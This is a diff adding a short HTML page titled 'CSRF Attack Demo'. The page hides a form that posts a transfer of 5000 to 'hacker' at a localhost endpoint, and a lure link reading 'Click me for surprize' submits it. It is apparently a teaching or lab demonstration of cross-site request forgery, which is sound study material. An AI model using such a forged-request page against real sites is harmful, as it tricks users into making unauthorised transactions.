@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h2>Click the link below to trigger CSRF attack</h2>
+
+    <form action="http://localhost:2035/transfer" method="POST" id="csrfForm">
+        <input type="hidden" name="to" value="hacker" />
+        <input type="hidden" name="amount" value="5000" />
+    </form>
+
+    <a href="#" onclick="document.getElementById('csrfForm').submit();">
+        Click me for surprize.
+    </a>
+</body>
+</html>
+
+
+<!-- Keep this file outside of project directory, may be you can keep in desktop of other drive. -->
